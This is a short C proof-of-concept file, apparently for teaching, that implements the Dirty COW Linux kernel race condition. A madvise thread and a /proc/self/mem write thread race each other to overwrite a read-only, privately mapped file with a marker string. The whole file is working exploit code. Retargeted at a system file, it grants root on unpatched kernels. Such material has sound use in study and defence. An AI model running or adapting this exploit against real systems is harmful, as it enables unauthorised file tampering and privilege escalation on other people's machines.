// racing.c
// example of writing into a read-only file
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>

// read-only file we want to write into
#define CONTENT_FILE "test"
// string to write
#define CONTENT_STRING "---THIS WAS WRITTEN BY DIRTY COW---"
// byte offset of the starting location to write to 
#define CONTENT_OFFSET 10

void *map;
pthread_t write_thread, madvise_thread;
struct stat st;
char *new_content = CONTENT_STRING;

void *madvise_worker(void *arg)
{
  while(1) {
    // tell the kernel that the memory-mapped file memory
    // section is no longer needed and can be freed
    madvise(map, st.st_size, MADV_DONTNEED);
  }
}

void *write_worker(void *arg)
{
  // open memory file descriptor in read-write mode
  int f = open("/proc/self/mem", O_RDWR);
  
  while(1) {
    // find the offset we are interested in writing
    lseek(f, (uintptr_t) map + CONTENT_OFFSET, SEEK_SET);
    // write new_contents starting at the current offset
    write(f, new_content, strlen(new_content));
  }
}

int main()
{
  // get the file descriptor, read-only mode
  int f = open(CONTENT_FILE, O_RDONLY);
  // get file status (we need size)
  fstat(f, &st);
  
  // map file to memory, in read-only and private mode
  map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);

  // create threads
  pthread_create(&write_thread, NULL, write_worker, NULL);
  pthread_create(&madvise_thread, NULL, madvise_worker, NULL);

  // wait for the threads to finish
  pthread_join(write_thread, NULL);
  pthread_join(madvise_thread, NULL);

  return 0;
}
